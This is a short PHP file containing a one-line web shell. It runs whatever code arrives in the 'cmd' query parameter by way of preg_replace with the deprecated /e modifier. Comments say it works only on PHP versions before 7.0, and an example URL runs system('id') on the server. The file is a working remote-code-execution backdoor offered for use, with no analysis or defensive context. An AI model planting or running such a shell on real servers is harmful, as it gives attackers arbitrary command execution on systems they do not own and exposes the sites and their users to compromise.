# This will only work if the preg_replace() function is enabled and not disabled in the PHP configuration.
# Additionally, the preg_replace() function must be configured to allow the /e modifier, which
# is deprecated and removed in later versions of PHP. This code will not work in PHP 7.0 and later.
# Execution: http://example.com/webshell_preg_replace.php?cmd=system('id')

<?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>